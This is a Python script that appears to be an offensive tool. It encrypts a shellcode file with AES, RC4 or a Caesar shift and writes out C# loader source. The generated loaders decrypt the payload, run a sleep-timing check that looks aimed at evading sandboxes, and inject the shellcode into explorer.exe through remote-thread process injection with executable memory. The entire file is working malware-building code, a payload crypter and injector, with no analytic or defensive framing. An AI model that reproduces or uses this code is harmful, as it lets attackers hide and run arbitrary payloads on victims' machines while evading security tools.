from Crypto.Cipher import AES, ARC4
from Crypto.Util.Padding import pad
import os
import sys

def encrypt_shellcode_aes(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))

    return iv, key, encrypted_shellcode

def encrypt_shellcode_caesar(shellcode_path, shift):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    encrypted_shellcode = bytearray(((byte + shift) & 0xFF) for byte in shellcode)

    return encrypted_shellcode

def encrypt_shellcode_rc4(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    cipher = ARC4.new(key)
    encrypted_shellcode = cipher.encrypt(shellcode)

    return encrypted_shellcode

def generate_cs_file(iv, key, encrypted_shellcode, output_path, method="AES"):
    encrypted_shellcode_str = ','.join(f'0x{b:02x}' for b in encrypted_shellcode)
    
    if method == "AES":
        iv_str = ','.join(f'0x{b:02x}' for b in iv)
        key_str = ','.join(f'0x{b:02x}' for b in key)
        
        cs_content = f"""
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ConsoleApp1
{{
    class Program
    {{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {{
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {{
                return;
            }}

            byte[] encryptedShellcode = new byte[{len(encrypted_shellcode)}] {{
                {encrypted_shellcode_str}
            }};

            byte[] iv = new byte[16] {{
                {iv_str}
            }};
            byte[] key = new byte[32] {{
                {key_str}
            }};

            byte[] decryptedShellcode = AESDecrypt(encryptedShellcode, key, iv);

            InjectShellcode(decryptedShellcode);
        }}

        static void InjectShellcode(byte[] shellcode)
        {{
            Process[] processes = Process.GetProcessesByName("explorer");
            if (processes.Length == 0)
            {{
                Console.WriteLine("Explorer.exe not found.");
                return;
            }}

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processes[0].Id);
            if (hProcess == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to open target process.");
                return;
            }}

            IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocatedMemory == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to allocate memory in target process.");
                CloseHandle(hProcess);
                return;
            }}

            if (!WriteProcessMemory(hProcess, allocatedMemory, shellcode, (uint)shellcode.Length, out _))
            {{
                Console.WriteLine("Failed to write shellcode to target process.");
                CloseHandle(hProcess);
                return;
            }}

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to create remote thread in target process.");
                CloseHandle(hProcess);
                return;
            }}

            CloseHandle(hThread);
            CloseHandle(hProcess);

            Console.WriteLine("Shellcode injected and running in explorer.exe");
        }}

        static byte[] AESDecrypt(byte[] data, byte[] key, byte[] iv)
        {{
            using (Aes aesAlg = Aes.Create())
            {{
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (var msDecrypt = new System.IO.MemoryStream(data))
                {{
                    using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {{
                        using (var srDecrypt = new System.IO.MemoryStream())
                        {{
                            csDecrypt.CopyTo(srDecrypt);
                            return srDecrypt.ToArray();
                        }}
                    }}
                }}
            }}
        }}
    }}
}}
"""
    elif method == "RC4":
        key_str = ','.join(f'0x{b:02x}' for b in key)
        
        cs_content = f"""
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{{
    class Program
    {{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {{
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {{
                return;
            }}

            byte[] encryptedShellcode = new byte[{len(encrypted_shellcode)}] {{
                {encrypted_shellcode_str}
            }};

            byte[] key = new byte[{len(key)}] {{
                {key_str}
            }};

            byte[] decryptedShellcode = RC4Decrypt(encryptedShellcode, key);

            InjectShellcode(decryptedShellcode);
        }}

        static void InjectShellcode(byte[] shellcode)
        {{
            Process[] processes = Process.GetProcessesByName("explorer");
            if (processes.Length == 0)
            {{
                Console.WriteLine("Explorer.exe not found.");
                return;
            }}

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processes[0].Id);
            if (hProcess == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to open target process.");
                return;
            }}

            IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocatedMemory == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to allocate memory in target process.");
                CloseHandle(hProcess);
                return;
            }}

            if (!WriteProcessMemory(hProcess, allocatedMemory, shellcode, (uint)shellcode.Length, out _))
            {{
                Console.WriteLine("Failed to write shellcode to target process.");
                CloseHandle(hProcess);
                return;
            }}

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to create remote thread in target process.");
                CloseHandle(hProcess);
                return;
            }}

            CloseHandle(hThread);
            CloseHandle(hProcess);

            Console.WriteLine("Shellcode injected and running in explorer.exe");
        }}

        public class RC4
        {{
            private byte[] S = new byte[256];
            private int x = 0;
            private int y = 0;

            public RC4(byte[] key)
            {{
                Initialize(key);
            }}

            private void Initialize(byte[] key)
            {{
                int keyLength = key.Length;
                for (int i = 0; i < 256; i++)
                {{
                    S[i] = (byte)i;
                }}

                int j = 0;
                for (int i = 0; i < 256; i++)
                {{
                    j = (j + S[i] + key[i % keyLength]) % 256;
                    Swap(i, j);
                }}
            }}

            private void Swap(int i, int j)
            {{
                byte temp = S[i];
                S[i] = S[j];
                S[j] = temp;
            }}

            public byte[] EncryptDecrypt(byte[] data)
            {{
                byte[] result = new byte[data.Length];
                for (int k = 0; k < data.Length; k++)
                {{
                    x = (x + 1) % 256;
                    y = (y + S[x]) % 256;
                    Swap(x, y);
                    result[k] = (byte)(data[k] ^ S[(S[x] + S[y]) % 256]);
                }}
                return result;
            }}
        }}

        static byte[] RC4Decrypt(byte[] data, byte[] key)
        {{
            RC4 rc4 = new RC4(key);
            return rc4.EncryptDecrypt(data);
        }}
    }}
}}
"""
    elif method == "Caesar":
        cs_content = f"""
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{{
    class Program
    {{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {{
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {{
                return;
            }}

            byte[] encryptedShellcode = new byte[{len(encrypted_shellcode)}] {{
                {encrypted_shellcode_str}
            }};

            byte[] decryptedShellcode = CaesarDecrypt(encryptedShellcode, 2);

            InjectShellcode(decryptedShellcode);
        }}

        static void InjectShellcode(byte[] shellcode)
        {{
            Process[] processes = Process.GetProcessesByName("explorer");
            if (processes.Length == 0)
            {{
                Console.WriteLine("Explorer.exe not found.");
                return;
            }}

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processes[0].Id);
            if (hProcess == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to open target process.");
                return;
            }}

            IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocatedMemory == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to allocate memory in target process.");
                CloseHandle(hProcess);
                return;
            }}

            if (!WriteProcessMemory(hProcess, allocatedMemory, shellcode, (uint)shellcode.Length, out _))
            {{
                Console.WriteLine("Failed to write shellcode to target process.");
                CloseHandle(hProcess);
                return;
            }}

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {{
                Console.WriteLine("Failed to create remote thread in target process.");
                CloseHandle(hProcess);
                return;
            }}

            CloseHandle(hThread);
            CloseHandle(hProcess);

            Console.WriteLine("Shellcode injected and running in explorer.exe");
        }}

        static byte[] CaesarDecrypt(byte[] data, int shift)
        {{
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {{
                decrypted[i] = (byte)(((uint)data[i] - shift) & 0xFF);
            }}
            return decrypted;
        }}
    }}
}}
"""
    with open(output_path, 'w') as f:
        f.write(cs_content)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 encrypt_shellcode.py <shellcode.bin> <output.cs> <method>")
        print("Methods: AES, Caesar, or RC4")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    output_path = sys.argv[2]
    method = sys.argv[3]

    if method == "AES":
        key = os.urandom(32)  # Generate a random 256-bit key
        iv, key, encrypted_shellcode = encrypt_shellcode_aes(shellcode_path, key)
        generate_cs_file(iv, key, encrypted_shellcode, output_path, method)
    elif method == "Caesar":
        shift = 2
        encrypted_shellcode = encrypt_shellcode_caesar(shellcode_path, shift)
        generate_cs_file(None, None, encrypted_shellcode, output_path, method)
    elif method == "RC4":
        key = os.urandom(16)  # Generate a random 128-bit key for RC4
        encrypted_shellcode = encrypt_shellcode_rc4(shellcode_path, key)
        generate_cs_file(None, key, encrypted_shellcode, output_path, method)
    else:
        print("Invalid method. Choose AES, Caesar, or RC4.")
        sys.exit(1)

    print(f"Generated {output_path} with the encrypted shellcode using {method} method.")
